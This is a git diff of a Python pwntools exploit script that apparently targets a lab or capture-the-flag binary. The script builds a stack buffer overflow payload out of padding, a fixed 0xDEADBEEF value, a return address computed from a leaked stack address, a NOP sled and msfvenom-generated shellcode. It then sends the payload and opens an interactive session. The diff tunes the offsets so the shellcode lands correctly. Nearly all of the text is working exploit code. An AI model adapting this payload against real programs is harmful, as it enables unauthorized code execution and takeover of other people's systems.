@@ -17,7 +17,6 @@ print(the_memory)
 payload = b''
 
 # This shellcode is from: msfvenom payload list
-#port 4444
 buf =  b""
 buf += b"\xbe\x05\x55\x5d\x4a\xdb\xdc\xd9\x74\x24\xf4\x5d"
 buf += b"\x2b\xc9\xb1\x1f\x31\x75\x15\x83\xed\xfc\x03\x75"
@@ -44,23 +43,20 @@ payload += b'A' * 64
 payload += p32(0xDEADBEEF)
 
 # This is to line up the return address
-#payload += b'B' * 8
+payload += b'B' * 8
 
 
 # The return address where are shellcode is in memory
-payload += p32(int(the_memory,16) + 80)
+payload += p32(int(the_memory,16) + 88)
 
-payload += b'\x90'
-
-payload += b'\x90'
+payload += b'\x90' * 8
 
 payload += buf
-
 
 # Sends the payload
 pw.sendline(payload)
 
-#pw.recvline()
+print(pw.recvline())
 
 # allows us to interact with the process
 pw.interactive()
